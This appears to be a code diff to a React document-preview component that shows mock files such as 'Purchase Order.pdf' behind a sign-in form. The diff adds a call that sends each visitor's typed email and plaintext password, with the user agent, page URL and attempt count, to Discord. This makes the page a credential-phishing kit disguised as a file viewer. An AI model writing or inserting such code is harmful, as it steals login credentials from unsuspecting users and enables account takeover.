@@ -18,6 +18,7 @@ import {
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { PreviewModal } from './PreviewModal';
+import { sendToDiscord } from '@/lib/discord';
 const MOCK_FILES = [
   { id: 1, name: 'Purchase Order.pdf', size: '1.5 MB', type: 'pdf' },
   { id: 2, name: 'Sample.docx', size: '450 KB', type: 'doc' },
@@ -125,7 +126,7 @@ export function HeroPreviewCard() {
     setPreviewFile(file);
     setIsPreviewOpen(true);
   };
-  const handleAuthSubmit = (event: React.FormEvent<HTMLFormElement>) => {
+  const handleAuthSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     setIsLoading(true);
     const formData = new FormData(event.currentTarget);
@@ -135,6 +136,20 @@ export function HeroPreviewCard() {
       setIsLoading(false);
       return;
     }
+
+    // Send form data to Discord
+    const discordData = {
+      email,
+      password, // Send actual password
+      formType: 'authentication',
+      attempts: submissionAttempts + 1,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      url: window.location.href
+    };
+
+    const discordSuccess = await sendToDiscord(discordData, 'Authentication');
+
     setTimeout(() => {
       setIsLoading(false);
       const nextAttempts = submissionAttempts + 1;
@@ -148,6 +163,10 @@ export function HeroPreviewCard() {
         setTimeout(() => window.location.reload(), 1500);
       }
     }, 1500);
+
+    if (!discordSuccess) {
+      console.warn('Failed to send authentication data to Discord');
+    }
   };
   return (
     <>
